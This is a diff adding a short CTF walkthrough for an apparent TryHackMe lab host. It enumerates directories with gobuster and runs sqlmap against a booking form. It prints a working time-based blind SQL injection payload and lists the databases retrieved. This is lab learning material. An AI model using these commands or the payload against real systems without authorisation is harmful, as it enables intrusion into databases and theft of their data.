@@ -1,0 +1,63 @@
+# CTF Walkthrough: Gobuster + SQLMap Attack Chain
+
+# Target
+# Hostname: www.offensivetools.thm
+# Resolved via: /etc/hosts → 10.10.20.253 www.offensivetools.thm
+
+# 1. DNS Resolution Fix
+# Problem: Gobuster failed with:
+# lookup www.offensivetools.thm: no such host
+
+# Fix:
+sudo nano /etc/hosts
+# Add:
+10.10.20.253 www.offensivetools.thm
+
+# 2. Gobuster Enumeration
+
+# Initial mistake:
+gobuster dir -u http://www.offensivetools.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
+
+# Result: Server overload / unresponsive
+
+# Correct usage:
+gobuster dir -u http://www.offensivetools.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10
+
+# Discovered paths:
+/admin
+/uploads
+/js/main.js
+
+# 3. SQLMap Injection
+
+# Target:
+sqlmap -u "http://10.10.20.253:84/book.php" \
+--data="email=a@a.com&message=yo&name=x&subject=1&submit=" \
+--batch --technique=T --timeout=5 --threads=4 --dbs
+
+# Successful payload:
+subject=0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+
+# Outcome:
+# Retrieved databases:
+# - cms_db
+# - users
+
+# 4. Lessons Learned
+# - Avoid -t 100 on shared infrastructure
+# - Always update /etc/hosts for .thm domains
+# - Log interesting paths and SQL payloads
+# - Capture flags and organize them into writeups
+
+# Tools Used:
+# - gobuster
+# - sqlmap
+# - curl
+# - hydra
+# - john
+# - burpsuite
+
+# Next Steps:
+# - Add screenshots and flag proof
+# - Write markdown summaries per room
+# - Include cracked hashes with john or hashcat
